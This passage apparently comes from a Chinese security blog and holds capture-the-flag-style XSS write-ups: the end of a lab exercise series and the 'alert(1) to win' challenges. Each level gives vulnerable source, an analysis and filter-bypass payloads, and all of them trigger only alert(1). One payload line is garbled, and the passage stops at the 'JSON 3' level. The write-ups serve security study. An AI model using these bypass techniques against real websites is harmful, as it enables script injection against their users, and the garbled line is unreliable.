<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Example-6-–-—–标签内-闭合标签"><a href="#Example-6-–-—–标签内-闭合标签" class="headerlink" title="Example 6 – —–标签内,闭合标签"></a>Example 6 – <script></script>—–标签内,闭合标签</h4><p>直接注入JavaScript代码中。<br>不闭合<code>script</code>标签的情况，可以考虑用<code>//</code>注释后面的代码</p>
<p>在一个<code>script</code>的标签内，先实现闭合<code>&quot;;alert(1)//,&quot;</code>;用来闭合前面，<code>//</code>注释后面。将<code>hello，hacker</code>的地方写一个<code>alert(1)</code>即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;;alert(1)&#x2F;&#x2F;</span><br><span class="line">&quot;;alert(1);var a&#x3D;&quot;</span><br></pre></td></tr></table></figure>

<p>顺带再闭合一下<code>script</code>标签也不是不可以，只是有点多此一举。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;;&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&#x2F;&#x2F;</span><br><span class="line">&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Example-7-–-标签内—–闭合标签"><a href="#Example-7-–-标签内—–闭合标签" class="headerlink" title="Example 7 – 标签内—–闭合标签"></a>Example 7 – <script></script>标签内—–闭合标签</h4><p>左右尖括号和双引号<code>&lt;,&gt;,&quot;</code>被HTML encoding。<br>如上个例子所述，其实并不需要用到尖括号，并且可以用单引号分割。<br>(用双引号还是单引号分割得看目标页面的代码怎么写，类似于python)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h4 id="Example-8-–-有过滤，表单"><a href="#Example-8-–-有过滤，表单" class="headerlink" title="Example 8 – 有过滤，表单"></a>Example 8 – 有过滤，表单</h4><p>对尖括号进行的过滤，转义；<br>有一个表单：输入<code>xxxx</code>点击提交，查看源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HELLO xxxxx&lt;form action&#x3D;&quot;&#x2F;xss&#x2F;example8.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">  Your name:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; &#x2F;&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>尖括号无法绕过，然后发现表单的url可以被重置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;xss&#x2F;example8.php&#x2F;&#x2F;%22%20onsubmit&#x3D;%22alert(&#39;1&#39;)</span><br></pre></td></tr></table></figure>

<p>然后点击提交，会触发弹窗</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#x2F;xss&#x2F;example8.php&#x2F;&quot; onsubmit&#x3D;&quot;alert(&#39;1&#39;)&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">  Your name:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; &#x2F;&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Example-9-–-直接在-后面添加alert-1"><a href="#Example-9-–-直接在-后面添加alert-1" class="headerlink" title="Example 9 – 直接在#后面添加alert(1)"></a>Example 9 – 直接在#后面添加alert(1)</h4><p>DOM型 XSS 的典型代表，恶意输入并没有直接反映在返回的HTML中，而要依赖浏览器动态执行JavaScript之后，恶意输入才能被执行。</p>
<p>把URL改成<code>http://192.168.150.157/xss/example9.php#alert(1)</code><br>首先看到代码里有<code>document.write(location.hash.substring(1));&lt;/script&gt;</code>，所以显然入口在这里。<br><code>document.write()</code>是把括号中的内容写到<code>HTML</code>文档中，<code>location.hash</code>就是得到<code>URL</code>中<code>#</code>开始的字符串，<code>substring(1)</code>就得到了<code>#</code>后的字符串。<br>所以就在#后加入payload：<code>#alert(1)</code></p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS靶场练习一</title>
    <url>/posts/32710.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶场地址：<a href="https://alf.nu/alert1" target="_blank" rel="noopener">alert(1) to win</a></p>
<h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span>+s+<span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>代码将输入直接拼接到了返回的字符串中，没有任何过滤，直接闭合<code>console.log(&quot;</code>即可。</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">13个字符</span><br><span class="line">&quot;);alert(1)&#x2F;&#x2F;</span><br><span class="line">12个字符</span><br><span class="line">&quot;);alert(1,&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Adobe"><a href="#Adobe" class="headerlink" title="Adobe"></a>Adobe</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s &#x3D; s.replace(&#x2F;&quot;&#x2F;g, &#39;\\&quot;&#39;);</span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s + &#39;&quot;);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="/posts/32710/1.png" alt="replace"></p>
<p>代码将输入的双引号加了一个<code>\</code>进行了转义，这样我们就不能像第一题那样闭合<code>console.log</code>了，但是没啥影响，有两种方法：</p>
<ul>
<li>闭合之前的<code>&lt;script&gt;</code>，然后再写一个<code>&lt;script&gt;</code></li>
<li>使用<code>\</code>来转义对<code>&quot;</code>进行转义的<code>\</code>，从而绕过对<code>&quot;</code>的过滤</li>
</ul>
<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方法一</span><br><span class="line">&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&#x2F;&#x2F;</span><br><span class="line">方法二</span><br><span class="line">\&quot;);alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s &#x3D; JSON.stringify(s);</span><br><span class="line">  return &#39;&lt;script&gt;console.log(&#39; + s + &#39;);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p><img src="/posts/32710/2.png" alt="JSON.stringify"></p>
<p>代码将输入使用<code>JSON.stringify</code>进行了处理，与第二题的方法一思路相同。</p>
<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var text &#x3D; s.replace(&#x2F;&lt;&#x2F;g, &#39;&lt;&#39;).replace(&#x2F;&quot;&#x2F;g, &#39;&quot;&#39;);</span><br><span class="line">  &#x2F;&#x2F; URLs</span><br><span class="line">  text &#x3D; text.replace(&#x2F;(http:\&#x2F;\&#x2F;\S+)&#x2F;g, &#39;&lt;a href&#x3D;&quot;$1&quot;&gt;$1&lt;&#x2F;a&gt;&#39;);</span><br><span class="line">  &#x2F;&#x2F; [[img123|Description]]</span><br><span class="line">  text &#x3D; text.replace(&#x2F;\[\[(\w+)\|(.+?)\]\]&#x2F;g, &#39;&lt;img alt&#x3D;&quot;$2&quot; src&#x3D;&quot;$1.gif&quot;&gt;&#39;);</span><br><span class="line">  return text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>代码进行了三步操作</p>
<ol>
<li>第一步，将<code>&lt;</code>和<code>&quot;</code>转成了HTML实体</li>
<li>第二步，如果存在<code>http://</code>的字符串， 会可以生成一个<code>a</code>标签</li>
<li>第三步，解析Markdown的图片的语法，如果存在<code>[[img123|Description]]</code>格式的字符串，则变为``。</li>
</ol>
<p>开头对<code>&quot;</code>和<code>&lt;</code>进行了编码操作，所以不能直接传入<code>&quot;</code>来闭合，当前思路就是构造一个字符串，使其满足后两个正则，从而引入<code>a</code>标签中的<code>&quot;</code>，从而闭合<code>img</code>标签的<code>alt</code>属性。</p>
<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[a|http:&#x2F;&#x2F;onerror&#x3D;alert(1)&#x2F;&#x2F;]]</span><br></pre></td></tr></table></figure>

<h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">    &#x2F;&#x2F; Slightly too lazy to make two input fields.</span><br><span class="line">    &#x2F;&#x2F; Pass in something like &quot;TextNode#foo&quot;</span><br><span class="line">    var m &#x3D; s.split(&#x2F;#&#x2F;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Only slightly contrived at this point.</span><br><span class="line">    var a &#x3D; document.createElement(&#39;div&#39;);</span><br><span class="line">    a.appendChild(document[&#39;create&#39; + m[0]].apply(document, m.slice(1)));</span><br><span class="line">    return a.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>代码实现了一个根据输入来创建的<code>DOM</code>节点的功能。<br>如果输入是<code>TextNode#foo</code>，那么执行的代码就是<code>document.createTextNode(&quot;foo&quot;)</code>。</p>
<p><strong>常用命令</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">createElement() 创建一个元素节点</span><br><span class="line">createTextNode() 创建一个文本节点</span><br><span class="line">createAttribute() 创建一个属性节点</span><br><span class="line">createComment() 创建一个注释节点</span><br></pre></td></tr></table></figure>

<p>经过尝试，通过<code>createComment()</code>创建一个注释节点，然后闭合注释可以达到代码执行的目的。</p>
<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">34个字符</span><br><span class="line">Comment#&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">32个字符</span><br><span class="line">Comment#&gt;&lt;iframe onload&#x3D;alert(1)</span><br></pre></td></tr></table></figure>

<h2 id="Callback"><a href="#Callback" class="headerlink" title="Callback"></a>Callback</h2><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  &#x2F;&#x2F; Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing &#x3D; s.split(&#x2F;#&#x2F;); </span><br><span class="line"></span><br><span class="line">  if (!&#x2F;^[a-zA-Z\[\]&#39;]*$&#x2F;.test(thing[0])) return &#39;Invalid callback&#39;;</span><br><span class="line">  var obj &#x3D; &#123;&#39;userdata&#39;: thing[1] &#125;;</span><br><span class="line">  var json &#x3D; JSON.stringify(obj).replace(&#x2F;&lt;&#x2F;g, &#39;\\u003c&#39;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>代码首先将输入的字符串按照<code>#</code>分割为两部分，第一部分是回调函数，只能使用大小写字母、<code>[</code>、<code>]</code>、<code>&#39;</code>，第二部分是<code>JSON</code>数据。<br>而且后面又将<code>JSON</code>数据中的尖括号转义成了<code>\\u003c</code>。<br>最终的目的依旧是执行<code>JS</code>代码，<code>thing[0]</code>部分不一定是一个函数，只要满足要求就OK。<br>既然回调函数名部分和后面的值都没有过滤单引号，可以在前后放两个单引号，从而闭合它们之间的值。再加个分号作为分割，后面就好操作了。</p>
<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;#&#39;;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="Skandia"><a href="#Skandia" class="headerlink" title="Skandia"></a>Skandia</h2><h3 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s.toUpperCase() + &#39;&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p>闭合<code>&lt;script&gt;</code>标签，但是方法<code>alert(1)</code>，被转换成大写了，无法执行，尝试编码绕过。</p>
<h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#x2F;script&gt;&lt;img src onerror&#x3D;&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h2><h3 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  function htmlEscape(s) &#123;</span><br><span class="line">    return s.replace(&#x2F;.&#x2F;g, function(x) &#123;</span><br><span class="line">       return &#123; &#39;&lt;&#39;: &#39;&lt;&#39;, &#39;&gt;&#39;: &#39;&gt;&#39;, &#39;&amp;&#39;: &#39;&amp;&#39;, &#39;&quot;&#39;: &#39;&quot;&#39;, &quot;&#39;&quot;: &#39;&#39;&#39; &#125;[x] || x;       </span><br><span class="line">     &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function expandTemplate(template, args) &#123;</span><br><span class="line">    return template.replace(</span><br><span class="line">        &#x2F;&#123;(\w+)&#125;&#x2F;g, </span><br><span class="line">        function(_, n) &#123; </span><br><span class="line">           return htmlEscape(args[n]);</span><br><span class="line">         &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  return expandTemplate(</span><br><span class="line">    &quot;                                                \n\</span><br><span class="line">      &lt;h2&gt;Hello, &lt;span id&#x3D;name&gt;&lt;&#x2F;span&gt;!&lt;&#x2F;h2&gt;         \n\</span><br><span class="line">      &lt;script&gt;                                       \n\</span><br><span class="line">         var v &#x3D; document.getElementById(&#39;name&#39;);    \n\</span><br><span class="line">         v.innerHTML &#x3D; &#39;&lt;a href&#x3D;#&gt;&#123;name&#125;&lt;&#x2F;a&gt;&#39;;       \n\</span><br><span class="line">      &lt;\&#x2F;script&gt;                                     \n\</span><br><span class="line">    &quot;,</span><br><span class="line">    &#123; name : s &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h2><p>代码对输入的<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>、进行了转义，输入的字符串会拼接在<code>{name}</code>处。<br>由于没有过滤<code>\</code>，可以利用<code>JS</code>的8进制或者16进制编码来绕过。</p>
<h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">32个字符</span><br><span class="line">\x3cimg src onerror&#x3D;alert(1)\x3e</span><br><span class="line">26个字符</span><br><span class="line">\x3cstyle&#x2F;onload&#x3D;alert(1)  &#x2F;&#x2F;末尾有一个空格</span><br></pre></td></tr></table></figure>

<h2 id="JSON-2"><a href="#JSON-2" class="headerlink" title="JSON 2"></a>JSON 2</h2><h3 id="源码-8"><a href="#源码-8" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s &#x3D; JSON.stringify(s).replace(&#x2F;&lt;\&#x2F;script&#x2F;gi, &#39;&#39;);</span><br><span class="line"></span><br><span class="line">  return &#39;&lt;script&gt;console.log(&#39; + s + &#39;);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>对<code>&lt;/script</code>标签进行了过滤，由于正则中存在<code>i</code>修饰符，不区分大小写，不能使用大小写混合来绕过。</p>
<p>由于直接将字符串替换为空，可以双写绕过。</p>
<h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#x2F;s&lt;&#x2F;scriptcript&gt;&lt;script&gt;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="Callback-2"><a href="#Callback-2" class="headerlink" title="Callback 2"></a>Callback 2</h2><h3 id="源码-9"><a href="#源码-9" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  &#x2F;&#x2F; Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing &#x3D; s.split(&#x2F;#&#x2F;); </span><br><span class="line"></span><br><span class="line">  if (!&#x2F;^[a-zA-Z\[\]&#39;]*$&#x2F;.test(thing[0])) return &#39;Invalid callback&#39;;</span><br><span class="line">  var obj &#x3D; &#123;&#39;userdata&#39;: thing[1] &#125;;</span><br><span class="line">  var json &#x3D; JSON.stringify(obj).replace(&#x2F;\&#x2F;&#x2F;g, &#39;\\&#x2F;&#39;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>与第6题的类似，但是转义了<code>/</code>，导致<code>//</code>这个注释符无法使用，但是<code>JavaScript</code>的注释符有三种，分别是<code>//</code>、<code>/**/</code>、<code>&lt;!--</code><br>可以使用来注释。</p>
<h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;#&#39;;alert(1)&lt;!--</span><br></pre></td></tr></table></figure>

<h2 id="Skandia-2"><a href="#Skandia-2" class="headerlink" title="Skandia 2"></a>Skandia 2</h2><h3 id="源码-10"><a href="#源码-10" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (&#x2F;[&lt;&gt;]&#x2F;.test(s)) return &#39;-&#39;;</span><br><span class="line"></span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s.toUpperCase() + &#39;&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>代码过滤了<code>&lt;</code>、<code>&gt;</code>。还将所有输入的字母变成了大写，不能借助<code>toUpperCase()</code>的特性来解了。<br>可以利用<code>jsfuck</code>。直接将<code>&quot;);alert(1)//</code>中的<code>alert(1)</code>用<code>jsfuck</code>表示。</p>
<p><a href="http://www.jsfuck.com/" target="_blank" rel="noopener">JSfuck</a></p>
<p>但是直接使用工具生成的<code>jsfuck</code>太长了，不过我们还有另一种方法，就是<code>JS</code>的匿名函数。</p>
<p>我们可以通过这种方法来执行任意方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[][&#39;map&#39;][&#39;constructor&#39;](&#39;alert(1)&#39;)()</span><br></pre></td></tr></table></figure>

<p>由于对字母进行了大写转换，我们可以将其进行8进制编码，然后闭合前面，注释后面。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;);[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\141\154\145\162\164(1)&#39;)()&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方法一</span><br><span class="line">&quotx2F;&#x2F;</span><br><span class="line">方法二</span><br><span class="line">&quot;);[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\141\154\145\162\164(1)&#39;)()&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h2><h3 id="源码-11"><a href="#源码-11" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var tag &#x3D; document.createElement(&#39;iframe&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; For this one, you get to run any code you want, but in a &quot;sandboxed&quot; iframe.</span><br><span class="line">  &#x2F;&#x2F;</span><br><span class="line">  &#x2F;&#x2F; https:&#x2F;&#x2F;4i.am&#x2F;?...raw&#x3D;... just outputs whatever you pass in.</span><br><span class="line">  &#x2F;&#x2F;</span><br><span class="line">  &#x2F;&#x2F; Alerting from 4i.am won&#39;t count.</span><br><span class="line"></span><br><span class="line">  s &#x3D; &#39;&lt;script&gt;&#39; + s + &#39;&lt;\&#x2F;script&gt;&#39;;</span><br><span class="line">  tag.src &#x3D; &#39;https:&#x2F;&#x2F;4i.am&#x2F;?:XSS&#x3D;0&amp;CT&#x3D;text&#x2F;html&amp;raw&#x3D;&#39; + encodeURIComponent(s);</span><br><span class="line"></span><br><span class="line">  window.WINNING &#x3D; function() &#123; youWon &#x3D; true; &#125;;</span><br><span class="line"></span><br><span class="line">  tag.setAttribute(&#39;onload&#39;, &#39;youWon &amp;&amp; alert(1)&#39;);</span><br><span class="line">  return tag.outerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>只要使<code>youWon</code>为<code>true</code>，这样就能执行<code>alert(1)</code>了。<br>解决思路是利用到<code>iframe</code>的特性，当在<code>iframe</code>中设置了一个<code>name</code>属性之后， 这个<code>name</code>属性的值就会变成<code>iframe</code>中的<code>window</code>对象的全局。</p>
<h3 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&quot;youWon&quot;</span><br></pre></td></tr></table></figure>

<h2 id="TI-S-M"><a href="#TI-S-M" class="headerlink" title="TI(S)M"></a>TI(S)M</h2><h3 id="源码-12"><a href="#源码-12" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  function json(s) &#123; return JSON.stringify(s).replace(&#x2F;\&#x2F;&#x2F;g, &#39;\\&#x2F;&#39;); &#125;</span><br><span class="line">  function html(s) &#123; return s.replace(&#x2F;[&lt;&gt;&quot;&amp;]&#x2F;g, function(s) &#123;</span><br><span class="line">                        return &#39;&amp;#&#39; + s.charCodeAt(0) + &#39;;&#39;; &#125;); &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &#39;&lt;script&gt;&#39; +</span><br><span class="line">      &#39;var url &#x3D; &#39; + json(s) + &#39;; &#x2F;&#x2F; We\&#39;ll use this later &#39; +</span><br><span class="line">    &#39;&lt;&#x2F;script&gt;\n\n&#39; +</span><br><span class="line">    &#39;  &lt;!-- for debugging --&gt;\n&#39; +</span><br><span class="line">    &#39;  URL: &#39; + html(s) + &#39;\n\n&#39; +</span><br><span class="line">    &#39;&lt;!-- then suddenly --&gt;\n&#39; +</span><br><span class="line">    &#39;&lt;script&gt;\n&#39; +</span><br><span class="line">    &#39;  if (!&#x2F;^http:.*&#x2F;.test(url)) console.log(&quot;Bad url: &quot; + url);\n&#39; +</span><br><span class="line">    &#39;  else new Image().src &#x3D; url;\n&#39; +</span><br><span class="line">    &#39;&lt;&#x2F;script&gt;&#39;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>本题用到了一个小<code>trick</code>:<br><code>HTML5</code>解析器会将<code>&lt;!--&lt;script&gt;</code>到<code>&lt;/script&gt;</code>之间的任何东西都当作<code>JavaScript</code>代码处理，同时要确保代码中还有一个<code>--&gt;</code>来防止解析器报语法错误。</p>
<p>首先输入一个<code>&lt;!--&lt;script&gt;</code>，此时的输出中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var url &#x3D; &quot;&lt;!--&lt;script&gt;&quot;; &#x2F;&#x2F; We&#39;ll use this later &lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- for debugging --&gt;</span><br><span class="line">  URL: &amp;#60;!--&amp;#60;script&amp;#62;</span><br><span class="line"></span><br><span class="line">&lt;!-- then suddenly --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  if (!&#x2F;^http:.*&#x2F;.test(url)) console.log(&quot;Bad url: &quot; + url);</span><br><span class="line">  else new Image().src &#x3D; url;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>这一段所有的代码都会当做<code>JS</code>执行。<br>在后面有个正则表达式<code>!/^http:.*/</code>，其中的<code>*/</code>可以当做注释，那么我们在前面再加入一个<code>/*</code>即可闭合。<br>此时的输出为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var url &#x3D; &quot;\&#x2F;*&lt;!--&lt;script&gt;&quot;; &#x2F;&#x2F; We&#39;ll use this later &lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- for debugging --&gt;</span><br><span class="line">  URL: &#x2F;*&amp;#60;!--&amp;#60;script&amp;#62;</span><br><span class="line"></span><br><span class="line">&lt;!-- then suddenly --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  if (!&#x2F;^http:.*&#x2F;.test(url)) console.log(&quot;Bad url: &quot; + url);</span><br><span class="line">  else new Image().src &#x3D; url;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>在注释符之前添加要执行的代码就可以了。</p>
<h3 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(alert(1)&#x2F;*&lt;!--&lt;script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="JSON-3"><a href="#JSON-3" class="headerlink" title="JSON 3"></a>JSON 3</h2><h3 id="源码-13"><a href="#源码-13" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">    return s.split(&#39;#&#39;).map(function(v) &#123;</span><br><span class="line">        &#x2F;&#x2F; Only 20% of slashes are end tags; save 1.2% of total</span><br><span class="line">        &#x2F;&#x2F; bytes by only escaping those.</span><br><span class="line">        var json &#x3D; JSON.stringify(v).replace(&#x2F;&lt;\&#x2F;&#x2F;g, &#39;&lt;\\&#x2F;&#39;);</span><br><span class="line">        return &#39;&lt;script&gt;console.log(&#39; + json + &#39;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">    &#125;).join(&#39;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

